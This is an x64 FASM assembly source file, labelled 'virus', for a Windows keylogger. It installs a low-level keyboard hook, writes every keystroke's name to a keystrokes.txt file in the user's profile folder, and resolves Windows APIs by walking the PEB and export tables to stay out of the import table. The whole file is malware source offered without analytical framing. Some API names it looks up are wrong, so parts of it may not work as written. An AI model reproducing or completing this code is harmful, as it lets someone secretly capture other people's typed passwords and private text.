format PE64 GUI 4.0
include 'win64a.inc'

virus:
    sub rsp, 28h	    ;reserve stack space for called functions
    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned
			      
REPS:
    lea rdx,[loadlib_func]
    lea rcx,[kernel32_dll]
    call lookup_api	    ;get address of LoadLibraryA
    mov r15, rax

    LEA RCX,[advapi32_dll]
    CALL R15

    lea rdx, [getuname_func]
    lea rcx, [advapi32_dll]
    call lookup_api

MOV RDX,usernamesize
MOV RCX,usernameb
CALL RAX

 lea rdx,[loadlib_func]
    lea rcx,[kernel32_dll]
    call lookup_api	    ;get address of LoadLibraryA
    mov r15, rax


lea rcx, [msvcrt32_dll]
    call r15		    ;load user32.dll
 
    lea rdx, [strcat_func]
    lea rcx, [msvcrt32_dll]
    call lookup_api	   

MOV RDX,usernameb
MOV RCX,filename2
CALL RAX


    lea rdx, [strcat_func]
    lea rcx, [msvcrt32_dll]
    call lookup_api	   

MOV RDX,filename
MOV RCX,filename2
CALL RAX
    lea rdx,[loadlib_func]
    lea rcx,[kernel32_dll]
    call lookup_api	    ;get address of LoadLibraryA
    mov r15, rax	    ;save for later use with forwarded exports
 
    lea rcx, [user32_dll]
    call rax		    ;load user32.dll
 
    lea rdx, [setwindowshook_func]
    lea rcx, [user32_dll]
    call lookup_api	    ;get address of GetAsyncKeyStatus To Get Keystrokes

    MOV R9,0
    MOV R8,0
    LEA RDX,[LowLevelKeyboardProc]
    MOV RCX,13
    CALL RAX ;SetWindowsHookEx
MOV [HHOOK],RAX


MESSAGEPROC:


    lea rdx, [getmessage_func]
    lea rcx, [user32_dll]
    call lookup_api	   

MOV RCX,msg
MOV RDX,0
MOV R8,0
MOV R9,0
CALL RAX

CMP RAX,0
JNZ PROCESSMSG


    lea rdx, [unhook_func]
    lea rcx, [user32_dll]
    call lookup_api	   

MOV RCX,[HHOOK]
CALL RAX


    lea rdx, [exit_func]
    lea rcx, [user32_dll]
    call lookup_api	   

MOV RCX,0
CALL RAX

PROCESSMSG:

lea rdx, [translatef_func]
lea rcx, [user32_dll]
call lookup_api

MOV RCX,msg
CALL RAX

lea rdx, [dispatchmessage_func]
lea rcx, [user32_dll]
call lookup_api

MOV RCX,msg
CALL RAX

JMP MESSAGEPROC

;########################################################################################################################


proc LowLevelKeyboardProc
MOV [VARIAVEL],RDX
MOV [VKEYSTROKE],R8
PUSH RCX
lea rdx, [mapvkeystroke_func]
    lea rcx, [user32_dll]
    call lookup_api
mov [mapvkeystroke_proc],rax

 lea rdx, [getkeystrokename_func]
    lea rcx, [user32_dll]
    call lookup_api
mov [getkeystrokename_proc],rax



 lea rdx,[loadlib_func]
    lea rcx,[kernel32_dll]
    call lookup_api	    ;get address of LoadLibraryA
    mov r15, rax
    POP RCX
CMP RCX,0
JAE PROCESSHOOK


RETURN:


    lea rdx, [callnexthookex_func]
    lea rcx, [user32_dll]
    call lookup_api
mov r9,0
mov r8,0
mov rdx,0
MOV RCX,0
CALL RAX

RETN

;########################################################################################################################

PROCESSHOOK:

MOV RDX,[VARIAVEL]
CMP RDX,WM_KEYUP
JZ RETURN2
CMP RDX,WM_SYSKEYUP
JZ RETURN2

MOV R8,[VKEYSTROKE]

MOV RBX,R8
MOV RBX,[RBX]

PUSH RBX

MOV [KEYSTROKE],RBX
cmp bl,2Fh
ja Q1
jmp add_spaces
Q1:
cmp bl,5Bh
jc no_add_spaces
add_spaces:
LEA RCX,[BUF]
MOV BYTE [RCX],20h
    lea rdx, [strcat_func]
    lea rcx, [msvcrt32_dll]
    call lookup_api	   

LEA RDX,[LBRACK]
LEA RCX,[BUF]
INC RCX

CALL RAX
LEA RDI,[BUF]
MOV RDX,0
MOV RBX,[KEYSTROKE]
MOVZX RCX,BL
call qword[mapvkeystroke_proc]	    ;MAP VIRTUAL KEY
shl rax,16
mov rcx,rax
MOV RDX,BUF
INC RDX
INC RDX
MOV R8,512
call qword [getkeystrokename_proc]	;GET KEY NAME TEXT]
MOV RDI,RAX
  lea rdx, [strcat_func]
    lea rcx, [msvcrt32_dll]
    call lookup_api
LEA RDX,[RBRACK]
lea rcx,[BUF]
INC RCX
CALL RAX

    lea rdx, [lstrlen_func]
    lea rcx, [msvcrt32_dll]
    call lookup_api
    LEA RCX,[BUF]
    CALL RAX
ADD RDI,RAX
mov [sizeofbuffer],RAX
INC RDI
LEA RDI,[BUF]
jmp Q2

no_add_spaces:
LEA RDI,[BUF]
MOV [RDI],BL
INC RDI
mov rbx,1
mov [sizeofbuffer],rbx
Q2:

POP RBX

 lea rdx,[loadlib_func]
    lea rcx,[kernel32_dll]
    call lookup_api	    ;get address of LoadLibraryA
    mov r15, rax

lea rcx, [msvcrt32_dll]
    call r15		    ;load user32.dll
 
    lea rdx, [fopen_func]
    lea rcx, [msvcrt32_dll]
    call lookup_api	   

MOV RDX,filemode
MOV RCX,filename2
CALL RAX
MOV [fp],RAX


 
    lea rdx, [fwrite_func]
    lea rcx, [msvcrt32_dll]
    call lookup_api	   

MOV R9,[fp]
MOV R8,1
MOV RDX,[sizeofbuffer]
MOV RCX,BUF
CALL RAX


    lea rdx, [fclose_func]
    lea rcx, [msvcrt32_dll]
    call lookup_api	   

MOV RCX,[fp]
CALL RAX

RETURN2:

    lea rdx, [callnexthookex_func]
    lea rcx, [user32_dll]
    call lookup_api	   
MOV R9,0
MOV R8,0
MOV RDX,0
MOV RCX,0
CALL RAX

ADD RSP,0C8h

RET
endp

;########################################################################################################################

;look up address of function from DLL export table
;rcx=DLL name string, rdx=function name string
;DLL name must be in uppercase
;r15=address of LoadLibraryA (optional, needed if export is forwarded)
;returns address in rax
;returns 0 if DLL not loaded or exported function not found in DLL
proc lookup_api
    sub rsp, 28h	    ;set up stack frame in case we call loadlibrary
 
start:
    xor rbx,rbx
    mov r8, [gs:rbx+60h]	;peb
    mov r8, [r8+18h]	    ;peb loader data
    lea r12, [r8+10h]	    ;InLoadOrderModuleList (list head) - save for later
    mov r8, [r12]	    ;follow _LIST_ENTRY->Flink to first item in list
    cld
 
for_each_dll:		    ;r8 points to current _ldr_data_table_entry
 
    mov rdi, [r8+60h]	    ;UNICODE_STRING at 58h, actual string buffer at 60h
    mov rsi, rcx	    ;pointer to dll we're looking for
 
compare_dll:
    lodsb		    ;load character of our dll name string
    test al, al 	    ;check for null terminator
    jz found_dll	    ;if at the end of our string and all matched so far, found it
 
    mov ah, [rdi]	    ;get character of current dll
    cmp ah, 61h 	    ;lowercase 'a'
    jl uppercase
    sub ah, 20h 	    ;convert to uppercase
 
uppercase:
    cmp ah, al
    jne wrong_dll	    ;found a character mismatch - try next dll
 
    inc rdi		    ;skip to next unicode character
    inc rdi
    jmp compare_dll	    ;continue string comparison
 
wrong_dll:
    mov r8, [r8]	    ;move to next _list_entry (following Flink pointer)
    cmp r8, r12 	    ;see if we're back at the list head (circular list)
    jne for_each_dll
 
    xor rax, rax	    ;DLL not found
    jmp done
 
found_dll:
    mov rbx, [r8+30h]	    ;get dll base addr - points to DOS "MZ" header
 
    mov r9d, [rbx+3ch]	    ;get DOS header e_lfanew field for offset to "PE" header
    add r9, rbx 	    ;add to base - now r9 points to _image_nt_headers64
    add r9, 88h 	    ;18h to optional header + 70h to data directories
			    ;r9 now points to _image_data_directory[0] array entry
			    ;which is the export directory
 
    mov r13d, [r9]	    ;get virtual address of export directory
    test r13, r13	    ;if zero, module does not have export table
    jnz has_exports
 
    xor rax, rax	    ;no exports - function will not be found in dll
    jmp done
 
has_exports:
    lea r8, [rbx+r13]	    ;add dll base to get actual memory address
			    ;r8 points to _image_export_directory structure (see winnt.h)
 
    mov r14d, [r9+4]	    ;get size of export directory
    add r14, r13	    ;add base rva of export directory
			    ;r13 and r14 now contain range of export directory
			    ;will be used later to check if export is forwarded
 
    mov ecx, [r8+18h]	    ;NumberOfNames
    mov r10d, [r8+20h]	    ;AddressOfNames (array of RVAs)
    add r10, rbx	    ;add dll base
 
    dec ecx		    ;point to last element in array (searching backwards)
for_each_func:
    lea r9, [r10 + 4*rcx]   ;get current index in names array
 
    mov edi, [r9]	    ;get RVA of name
    add rdi, rbx	    ;add base
    mov rsi, rdx	    ;pointer to function we're looking for
 
compare_func:
    cmpsb
    jne wrong_func	    ;function name doesn't match
 
    mov al, [rdi]	    ;current character of our function
    test al, al 	    ;check for null terminator
    jz found_func	    ;if at the end of our string and all matched so far, found it
 
    jmp compare_func	    ;continue string comparison
 
wrong_func:
    loop for_each_func	    ;try next function in array
 
    xor rax, rax	    ;function not found in export table
    jmp done
 
found_func:		    ;ecx is array index where function name found
 
			    ;r8 points to _image_export_directory structure
    mov r9d, [r8+24h]	    ;AddressOfNameOrdinals (rva)
    add r9, rbx 	    ;add dll base address
    mov cx, [r9+2*rcx]	    ;get ordinal value from array of words
 
    mov r9d, [r8+1ch]	    ;AddressOfFunctions (rva)
    add r9, rbx 	    ;add dll base address
    mov eax, [r9+rcx*4]     ;Get RVA of function using index
 
    cmp rax, r13	    ;see if func rva falls within range of export dir
    jl not_forwarded
    cmp rax, r14	    ;if r13 <= func < r14 then forwarded
    jae not_forwarded
 
    ;forwarded function address points to a string of the form <DLL name>.<function>
    ;note: dll name will be in uppercase
    ;extract the DLL name and add ".DLL"
 
    lea rsi, [rax+rbx]	    ;add base address to rva to get forwarded function name
    lea rdi, [rsp+30h]	    ;using register storage space on stack as a work area
    mov r12, rdi	    ;save pointer to beginning of string
 
copy_dll_name:
    movsb
    cmp byte [rsi], 2eh     ;check for '.' (period) character
    jne copy_dll_name
 
    movsb				;also copy period
    mov dword  [rdi], 004c4c44h      ;add "DLL" extension and null terminator
 
    mov rcx, r12	    ;r12 points to "<DLL name>.DLL" string on stack
    call r15		    ;call LoadLibraryA with target dll
 
    mov rcx, r12	    ;target dll name
    mov rdx, rsi	    ;target function name
    jmp start		    ;start over with new parameters
 
not_forwarded:
    add rax, rbx	    ;add base addr to rva to get function address
done:
    add rsp, 28h	    ;clean up stack
    ret
    BUF      DB 512    dup    (0)
spaces	  db	512    dup    (0)
fp	 dq 0
filename db "\keystrokes.txt",0
filemode db  'a',0
VKEYSTROKE dq	0
sizeofuname	   dq	 255
HHOOK	   dq 0
VARIAVEL DQ 0
struct MSG2
  hwnd	  dq ?
  message dd ?,?
  wParam  dq ?
  lParam  dq ?
  time	  dd ?
  pt	  POINT
	  dd ?
ends
msg	    MSG2
kbptr	   dq 0
nullp	   dq 0
user32_dll				db  'USER32.DLL', 0
msvcrt32_dll				db  'MSVCRT.DLL', 0
advapi32_dll				db  'ADVAPI32.DLL', 0
kernel32_dll				db  "KERNEL32.DLL",0
loadlib_func				db   "LoadLibraryA",0
setwindowshook_func   db  'SetWindowsHookExA', 0
getmessage_func       db   "GetMessageA",0
translatef_func       db   "TranslateMessageA",0
dispatchmessage_func	   db	"DispatchMessageA",0
unhook_func	      db   "UnhookWindowsHookExA",0
callnexthookex_func	      db   "CallNextHookExA",0
getuname_func	    db	 "GetUserNameA",0
sizeofbuffer	    dq	 0
ENDOF		    dw	 0
fopen_func				db  'fopen', 0
fwrite_func				db  'fwrite',0
fclose_func				db  'fclose',0
strcat_func				db  'strcat',0
lstrlen_func				 db  'strlen',0
exit_func		    db	'ExitProcess', 0
getkeystrokename_func	    db	'GetKeyNameTextA',0
mapvkeystroke_func		 db  'MapVirtualKeyA',0
usernamesize		    dq	512
getkeystrokename_proc	    dq	0
mapvkeystroke_proc	    dq	0
MAPPEDKS		    DQ	0
LBRACK			    db	'[',0
RBRACK			    db	']',0
KEYSTROKE		    dq	0
NL			    DQ	0
usernameb		    db	512 dup (0)
filename2		    db	"C:\Users\",0
endp